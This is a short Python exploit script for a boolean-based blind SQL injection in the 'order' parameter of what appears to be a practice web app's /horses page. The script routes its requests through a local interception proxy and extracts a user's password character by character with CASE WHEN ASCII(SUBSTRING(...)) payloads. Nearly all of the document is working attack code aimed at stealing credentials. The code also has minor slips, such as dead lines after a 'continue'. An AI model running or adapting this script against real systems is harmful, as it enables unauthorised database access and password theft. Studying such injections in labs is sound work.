# SQL Injection at app.py line 32

# If the string is true, the order by will filter by Name, else will filter by Description.

import urllib3
import sys
import requests
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = 'http://' + sys.argv[1] + ':5000/horses?order='

def injection(url):

    password_extracted = ""
    
    print("Finding password: ")

    # Loop through each position in the password (assuming it's up to 20 characters long)
    for i in range(1, 20):

        previousLength = len(password_extracted)

        # Loop through ASCII values of printable characters (32 to 126) - https://theasciicode.com.ar/
        for j in range(32, 127):

            # Construct SQL injection payload
            # You have to compare the character in ascii decimal value
            payload = "(CASE WHEN (SELECT ASCII(SUBSTRING(password, %s, 1)) FROM users where user_id = '1')=%s THEN Name ELSE Description END)" % (i, j)

            payload_encoded = urllib.parse.quote(payload)

            finalURL = url + payload_encoded

            # print(finalURL)
            
            r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)

            soup = BeautifulSoup(r.text, 'html.parser')
            td_tag = soup.find('td').get_text()
            
            # If 'aaron' is not the frist <td> element, this means it is filtering by Descrption
            if "Aaron" not in td_tag:
                continue
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break  # Move on to the next character in the password

        # If the length remains the same, it means that the loop through character dind't add any character to the password, so it has probably already been found
        if previousLength == len(password_extracted):
            sys.stdout.write("\n")
            break

injection(url)